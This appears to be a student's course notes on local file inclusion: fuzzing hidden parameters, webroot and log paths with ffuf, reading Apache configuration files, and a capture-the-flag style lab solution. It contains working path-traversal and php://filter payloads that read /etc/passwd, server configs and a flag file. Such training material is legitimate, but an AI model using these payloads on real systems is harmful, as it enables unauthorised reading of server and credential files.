# Fuzzing Parameters
---
- The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks.
- However, in many cases, **the page may have other exposed parameters that are not linked to any HTML forms,** and hence **==normal users would never access==** or unintentionally cause harm through.
- This is why it may be **==important to fuzz for exposed parameters==**, as they tend not to be as secure as public ones.
- For example, we can fuzz the page for common `GET` parameters, as follows:

`ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287`

- Once we identify an exposed parameter that isn't linked to any forms we tested, **we can perform all of the LFI tests discussed in this module.**
- **Tip:** For a more precise scan, we can limit our scan to the most **==popular LFI parameters found on this [link](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters).==**

# LFI wordlists
---
- There are **different server files that may be helpful in our LFI exploitation**, so it would be helpful to know **where such files exist and whether we can read them.**
- Such files include: `Server webroot path`, `server configurations file`, and `server logs`.

## Server Webroot
- We may need to know the **full server webroot path to complete our exploitation in some cases**.
- For example, if we wanted to locate a file we uploaded, **but we cannot reach its `/uploads` directory through relative paths** (e.g. `../../uploads`).
- In such cases, we may need to figure out the server webroot path so that we can locate our **==uploaded files through absolute paths instead of relative paths.==**

- To do so, **==we can fuzz for the `index.php` file through common webroot paths,==** which we can find in this [wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or this [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).
- Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.
- The following is an example of how we can do all of this with ffuf:
  
`ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287`
![[Pasted image 20251105060912.png]]

- As we can see, the scan did **indeed identify the correct webroot path at (`/var/www/html/`).**
- We may also use the **same [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist we used earlier,** as it also contains various payloads that may reveal the webroot.

## Server Logs/Configurations
- As we have seen in the previous section, we **==need to be able to identify the correct logs directory to be able to perform the log poisoning attacks==** we discussed.
- Furthermore, as we just discussed, **we may also need to read the server configurations** to be able to **==identify the server webroot path==** and other important information (like the logs path!).
- To do so, **==we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths==** we may be interested in.
- If we wanted a **more precise scan**, **we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)**, though they are not part of `seclists`, so we need to download them first.
- Let's try the Linux wordlist against our LFI vulnerability, and see what we get:

`ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287`
![[Pasted image 20251105062148.png]]

- As we can see, the scan returned over 60 results, many of which **==were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us that a precise scan is important in certain cases==**.
- Now, we can try reading any of these files to see whether we can get their content. **We will read (`/etc/apache2/apache2.conf`), as it is a known path for the apache server configuration**:
  
`curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf`
![[Pasted image 20251105062334.png]]

- As we can see, we do **get the default webroot path and the log path**.
- However, in this case, the **log path is using a global ==apache variable== (`APACHE_LOG_DIR`)**, which are **==found in another file we saw above, which is (`/etc/apache2/envvars`),==** and we can read it to find the variable values:
  
`curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars`
![[Pasted image 20251105062327.png]]
- As we can see, the (`APACHE_LOG_DIR`) variable is set to (`/var/log/apache2`), and the previous **configuration told us that the log files are `/access.log` and `/error.log`,** which have accessed in the previous section.

**Note:** Of course, **==we can simply use a wordlist to find the logs, as multiple wordlists we used in this sections did show the log location.==** 
But this exercises shows us how we can manually go through identified files, and then use the information we find to further identify more files and important information.
This is quite similar to when we read different file sources in the `PHP filters` section, and such efforts may reveal previously unknown information about the web application, which we can use to further exploit it.

# LFI Tools
---
- Finally, **we can utilize a number of LFI tools to automate much of the process we have been learning**, which may save time in some cases, but **may also miss many vulnerabilities and files** we may otherwise identify through manual testing. 
- The **==most common LFI tools are [LFISuite](https://github.com/D35m0nd142/LFISuite), [LFiFreak](https://github.com/OsandaMalith/LFiFreak), and [liffy](https://github.com/mzfr/liffy).==** We can also search GitHub for various other LFI tools and scripts, but in general, most tools perform the same tasks, with varying levels of success and accuracy.
- Unfortunately, **most of these tools are not maintained and rely on the outdated `python2`,** so using them may not be a long term solution. Try downloading any of the above tools and test them on any of the exercises we've used in this module to see their level of accuracy.

# Assessment - Did on my own
---
- Nothing, no parameter at quick glance
- ![[Pasted image 20251105063307.png]]

- Let's fuzz `index.php` if it has any parameters:
	- `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.251.67:31367/index.php?FUZZ=value' -fs 2309`
	- ![[Pasted image 20251105063353.png]]

- Tried basic bypass methods but did not work. **Tried php filter, which seemed like working**:
	- `http://83.136.251.67:31367/index.php?view=php://filter/read=convert.base64-encode/resource=index`
	- History text does not load![[Pasted image 20251105070635.png]]

- Try **bruteforcing** this `index` parameter with **LFI payloads from `LFI-Jhaddix.txt`** :
	- `ffuf -w ~/Downloads/LFI-Jhaddix.txt:FUZZ -u 'http://83.136.251.67:31367/index.php?view=php://filter/read=convert.base64-encode/resource=FUZZ' -fs 1935`
	- ![[Pasted image 20251105070745.png]]

- Payload: `../../../../../../../../../../../../../../../../../../../../../../etc/passwd`
- ![[Pasted image 20251105070812.png]]

- Read the flag:
	- `http://83.136.251.67:31367/index.php?view=php://filter/read=convert.base64-encode/resource=../../../../../../../../../../../../../../../../../../../../../../flag.txt`
	- ![[Pasted image 20251105070910.png]]